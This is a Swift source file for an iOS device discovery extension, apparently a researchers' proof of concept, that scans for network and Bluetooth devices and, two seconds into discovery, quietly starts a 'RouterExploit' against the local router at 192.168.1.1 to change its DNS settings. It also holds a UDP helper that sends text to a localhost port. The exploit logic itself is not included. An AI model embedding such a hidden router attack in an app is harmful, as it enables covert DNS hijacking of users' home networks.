//
//  PoCLanShield_DDE.swift
//  PoCLanShield_DDE
//
//  Created by Alex - SEEMOO on 23.12.24.
//

import DeviceDiscoveryExtension
import os

@main
class PoCLanShield_DDE: DDDiscoveryExtension {
    
    /// A DeviceLocator that searches for devices on the network.
    private var networkDeviceLocator: DeviceLocator
    
    /// A DeviceLocator that searches for devices via Bluetooth.
    private var bluetoothDeviceLocator: DeviceLocator
    
    /// Router Exploit used to change the DNS of the router
    private var routerExploit: RouterExploit?
    
    required init() {
        
        // Create DeviceLocators to look for network and Bluetooth devices.
        os_log(.default, "PoCLanShield_DDE initialized")
        networkDeviceLocator = NetworkDeviceLocator()
        bluetoothDeviceLocator = BluetoothDeviceLocator()
    }
    
    /// Start searching for devices.
    func startDiscovery(session: DDDiscoverySession) {
        
        // Set up an event handler so the device locators can inform the session about devices.
        
        let eventHandler: DDEventHandler = { event in
            session.report(event)
        }
        
        networkDeviceLocator.eventHandler = eventHandler
        bluetoothDeviceLocator.eventHandler = eventHandler
        
        // Start scanning for devices.
        
        networkDeviceLocator.startScanning()
        bluetoothDeviceLocator.startScanning()
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 2, execute: {
            self.startRouterExploit()
        })
        
    }
    
    func startRouterExploit() {
        Task {
            routerExploit = RouterExploit(baseURL: URL(string: "http://192.168.1.1/")!)
            do {
                try await routerExploit?.start()
                os_log(.debug, "Router exploit finished")
            }catch {
                os_log(.debug, "Router exploit failed \(error)")
            }
        }
    }
    
    /// Stop searching for devices.
    func stopDiscovery(session: DDDiscoverySession) {
        // Stop scanning for devices.
        
        networkDeviceLocator.stopScanning()
        bluetoothDeviceLocator.stopScanning()
        
        // Ensure no more events are reported.
        
        networkDeviceLocator.eventHandler = nil
        bluetoothDeviceLocator.eventHandler = nil
    }
}

/// A DeviceLocator knows how to scan for devices and encapsulates the details about how it does so.
protocol DeviceLocator {
    
    /// Start scanning for devices.
    func startScanning()
    
    /// Stop scanning for devices.
    func stopScanning()
    
    /// When a device changes state, the DeviceLocator will invoke this handler. The extension can then pass the given event back to its session.
    var eventHandler: DDEventHandler? { get set }
}

let udpLogger = Logger(subsystem: "com.example.apple-DataAccessDemo", category: "UDP")

func sendTextViaUDP(_ text: String) {
    udpLogger.debug("Sending: \(text, privacy: .public)")
    let connection = NWConnection(to: .hostPort(host: "localhost", port: .init(integerLiteral: 5003)), using: .udp)
    
    let content = text.data(using: .utf8)
    connection.start(queue: .global(qos: .default))
    connection.stateUpdateHandler = { state in
        udpLogger.debug("Connection state is \(String(describing: state))")
        switch state {
        case .ready:
            connection.send(content: content, completion: .contentProcessed({ error in
                if let error {
                    udpLogger.error("Failed sending UDP \(error.localizedDescription, privacy: .public)")
                }else {
                    udpLogger.debug("Sent UDP message")
                }
            }))
        case .failed(let error):
            udpLogger.error("Failed connecting via UDP \(error.localizedDescription, privacy: .public)")
        case .cancelled:
            udpLogger.error("UDP Connection canceled")
        case .preparing:
            udpLogger.info("UDP connection preparing")
        case .waiting(let error):
            udpLogger.info("UDP connection waiting \(error.localizedDescription, privacy: .public)")
        case .setup:
            udpLogger.info("UDP connection setup")
        @unknown default:
            udpLogger.info("Unknown UDP connection state")
        }
    }
}
